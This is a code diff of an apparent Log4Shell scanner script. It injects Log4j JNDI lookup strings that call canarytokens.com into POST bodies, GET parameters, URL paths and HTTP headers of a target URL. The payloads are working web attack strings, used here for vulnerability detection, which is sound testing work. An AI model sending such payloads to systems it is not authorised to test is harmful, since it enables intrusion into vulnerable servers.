@@ -14,6 +14,7 @@ CANARY_TOKEN = 'ujz5sgvgo7xuvn03ft9qrws5w'
 
 def check_post_parameter(method: str, identifier: str, url: str, parameters: list[str], canarytoken: str):
     try:
+        # Injects POST body parameters
         if method == "POST":
             # Generate POST body without url-encode (probably can be prettier)
             data = "{"
@@ -36,6 +37,7 @@ def check_post_parameter(method: str, identifier: str, url: str, parameters: lis
             )
             logging.info(f"Status code: {r.status_code} - POST")
 
+        # Injects GET parameters
         elif method == "GET":
             data = {}
             for parameter in parameters:
@@ -53,28 +55,10 @@ def check_post_parameter(method: str, identifier: str, url: str, parameters: lis
             )
             logging.info(f"Status code: {r.status_code} - GET")
 
-        elif method == "BOTH":
-            # Generate POST body without url-encode (probably can be prettier)
-            data = "{"
-            for parameter in parameters:
-                data += f"{parameter}=${{jndi:ldap://x{identifier}-{parameter}.L4J.{canarytoken}.canarytokens.com/a}}&"
-            data = data[:-1]
-            data += "}"
-
-            r = requests.post(
-                url,
-                data=data,
-                headers={
-                    'Content-Type': 'text/plain', 
-                    'User-Agent': f"${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
-                    'Referer': f"${{jndi:ldap://x{identifier}-referer.L4J.{canarytoken}.canarytokens.com/a}}",
-                    'X-Forwarded-For': f"${{jndi:ldap://x{identifier}-x-forwarded-for.L4J.{canarytoken}.canarytokens.com/a}}",
-                    'Authentication': f"${{jndi:ldap://x{identifier}-authentication.L4J.{canarytoken}.canarytokens.com/a}}"
-                },
-                verify=False
-            )
-            logging.info(f"Status code: {r.status_code} - POST")
-
+        # Injects URL without paramters (No Parameters)
+        elif method == "GETNP":
+            if url[-1] == "/":
+                url = url[:-1]
             r = requests.get(
                 f"{url}/${{jndi:ldap://x{identifier}-header.L4J.{canarytoken}.canarytokens.com/a}}",
                 headers={
